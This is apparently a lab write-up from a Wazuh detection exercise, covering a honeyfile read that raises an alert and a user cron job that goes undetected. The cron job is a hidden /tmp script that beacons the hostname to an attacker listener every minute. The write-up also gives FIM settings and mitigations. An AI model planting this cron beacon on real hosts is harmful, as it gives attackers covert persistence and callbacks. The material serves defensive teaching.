# 05 — Data Access and Persistence

## Objective

Demonstrate two post-exploitation activities with different detection
properties:

- access to a honeyfile, which is deliberately monitored and should produce
  an immediate Wazuh alert;
- persistence through a user-level cron job, which is intentionally discreet
  and does not produce a Wazuh alert with the default monitoring scope used
  in this lab.

This distinction is important. A SIEM only detects events that an agent
collects and sends to the manager. The absence of an alert does not prove
that no persistence exists.

## Step 1 — Honeyfile access

```bash
cat /var/www/app/backup_credentials.txt
```

The file is a canary: it contains no legitimate secret, but any read of it is
unexpected and therefore suspicious. In this lab, the access is detected by
the audit/FIM configuration associated with the honeyfile. The event below is
an abbreviated representation of the alert forwarded by Wazuh:

```json
{
    "ip": "192.168.1.2",
    "name": "ubuntu-server",
    "full_log": "type=CONFIG_CHANGE msg=audit(1792169106.626:948): auid=1000 ses=62 subj=unconfined op=add_rule key=\"honeyfile_access\" list=4 res=1\u001dAUID=\"dat\" type=SYSCALL msg=audit(1792169106.626:948): arch=c000003e syscall=44 success=yes exit=1112 a0=3 a1=7ffc87db8680 a2=458 a3=0 items=0 ppid=4599 pid=4618 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=62 comm=\"auditctl\" exe=\"/usr/sbin/auditctl\" subj=unconfined key=(null)\u001dARCH=x86_64 SYSCALL=sendto AUID=\"dat\" UID=\"root\" GID=\"root\" EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\" type=PROCTITLE msg=audit(1792169106.626:948): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573",
    "timestamp": "2026-10-16T16:45:07.491+0000"
}
```

The alert is visible because the path was explicitly selected as a detection
point. This is different from the cron persistence shown below: the honeyfile
has an event source and a rule designed for it, whereas the user's crontab is
not in the default FIM paths of this lab.

## Step 2 — Persistence via cron

```bash
# Create the beacon script
cat > /tmp/.hidden_beacon.sh << 'EOF'
#!/bin/bash
curl -s "http://10.10.10.10:8000/beacon?host=$(hostname)" > /dev/null 2>&1
EOF
chmod +x /tmp/.hidden_beacon.sh

# Register as a cron job
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.hidden_beacon.sh") | crontab -
```

### What the command does

The first part creates `/tmp/.hidden_beacon.sh`:

```bash
#!/bin/bash
curl -s "http://10.10.10.10:8000/beacon?host=$(hostname)" > /dev/null 2>&1
```

- `#!/bin/bash` tells cron which interpreter should execute the file.
- `curl -s` performs the outbound HTTP request in silent mode. It does not
  display its progress meter or normal diagnostic output.
- `$(hostname)` adds the compromised host name to the request, allowing the
  attacker to identify the machine that called back.
- `> /dev/null 2>&1` discards both standard output and standard error. The
  command therefore does not write a useful result to the cron mail mechanism
  and does not leave output in the terminal.
- `chmod +x` makes the script executable by the account that owns the
  crontab.

The second command installs a job in the current user's crontab. Its schedule
has five fields:

```text
* * * * * command
│ │ │ │ │
│ │ │ │ └─ day of week
│ │ │ └─── month
│ │ └───── day of month
│ └─────── hour
└───────── minute
```

Five asterisks mean "every value", so cron starts the script once per minute.
The exact file is normally stored in the user's spool, for example:

```text
/var/spool/cron/crontabs/<USER>
```

The command uses `crontab -l 2>/dev/null` to preserve existing entries and
append the new one. Suppressing the error is useful when the user has no
crontab yet, because `crontab -l` may otherwise print a "no crontab" message.
The resulting text is piped to `crontab -`, which replaces the user's
crontab with the combined content.

This is a user-level persistence mechanism. It does not need a new system
service, a modification to `/etc/cron.d`, or a visible interactive process
left running. It will run again after the user logs in or the machine
restarts, provided the cron service is enabled and the user's crontab remains
present.

## Result

Every minute, the compromised server beacons back to Kali:

```text
┌──(kali㉿kali)-[~]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.2 - - [16/Oct/2026 12:58:01] code 404, message File not found
192.168.1.2 - - [16/Oct/2026 12:58:01] "GET /beacon?host=ubuntu-server HTTP/1.1" 404 -
192.168.1.2 - - [16/Oct/2026 12:59:01] code 404, message File not found
192.168.1.2 - - [16/Oct/2026 12:59:01] "GET /beacon?host=ubuntu-server HTTP/1.1" 404 -
```

The `404` is expected: Python's simple HTTP server does not define a
`/beacon` application endpoint. The important evidence is the repeated
request from `192.168.1.2` at one-minute intervals, not the HTTP response
body. The callback proves that cron executed the script and that the
compromised host could reach the attacker listener.

## Why there is no Wazuh alert in this capture

The empty Wazuh section is an expected result for this configuration. Wazuh
does not magically inspect every file or every process on a Linux host. Its
agent collects the sources configured in `ossec.conf`, such as selected log
files, audit events, command output, and explicitly monitored FIM paths.

In this lab, Wazuh does **not** monitor
`/var/spool/cron/crontabs/<USER>` by default. Consequently, writing the
user's crontab does not create a FIM event for the manager to correlate. The
command also does not necessarily create a conventional authentication or
application log entry: `crontab` writes the spool file and exits, while the
scheduled script redirects its own output to `/dev/null`.

There are several additional reasons why the callback itself may not appear
in Wazuh:

- the HTTP server is running on Kali, not on the monitored application host;
- the reverse proxy is not involved in this direct connection;
- no outbound network-flow or firewall log for this destination is shown in
  the current Wazuh inputs;
- no audit rule is necessarily collecting every `execve` of `crontab`, `bash`,
  or `curl`;
- the job runs briefly and produces no persistent process for a process
  inventory rule to report.

Wazuh sees the honeyfile because that file was deliberately instrumented, but it has no equivalent event for this
unmonitored user crontab. This is a monitoring coverage gap, not proof that
the cron job failed. The repeated callback confirms that it executed.

To detect this persistence, explicitly monitor the relevant paths and event
sources. For example, a defensive Wazuh FIM configuration can include the
cron spool and system cron locations:

```xml
<syscheck>
  <directories realtime="yes" report_changes="yes">/var/spool/cron/crontabs</directories>
  <directories realtime="yes" report_changes="yes">/etc/cron.d</directories>
  <directories realtime="yes" report_changes="yes">/etc/crontab</directories>
</syscheck>
```

FIM alone may identify *that* the file changed without explaining *which
process* changed it. For stronger attribution, combine it with auditd rules
for the cron spool and execution events, process telemetry, and outbound
firewall/proxy logging. The goal is to correlate:

```text
crontab modification
        + account performing the change
        + new executable/script path
        + cron/bash/curl execution
        + unusual outbound destination
```


## Mitigation

- Monitor `/var/spool/cron/crontabs`, `/etc/crontab`, and `/etc/cron.d` with
  Wazuh FIM, while allowing for legitimate administrative changes.
- Use auditd or equivalent endpoint telemetry to record changes to cron files
  and executions of `crontab`, `bash`, and unexpected network clients.
- Alert on outbound connections from the application host to destinations that
  are not required by the application. Prefer an allow-list for egress from
  the DMZ or backend network.
- Restrict write access to system cron directories and run the application
  under a dedicated unprivileged account.
- Review user crontabs with `crontab -l` for each relevant account and inspect
  `/var/spool/cron/crontabs` during incident response. Also review systemd
  timers, shell startup files, init scripts, SSH keys, and webroot files;
  attackers often use more than one persistence location.
- Remove the malicious job and script only after preserving evidence, then
  rotate credentials and investigate the initial access path.
- Isolate and rebuild a compromised host rather than trusting manual cleanup.
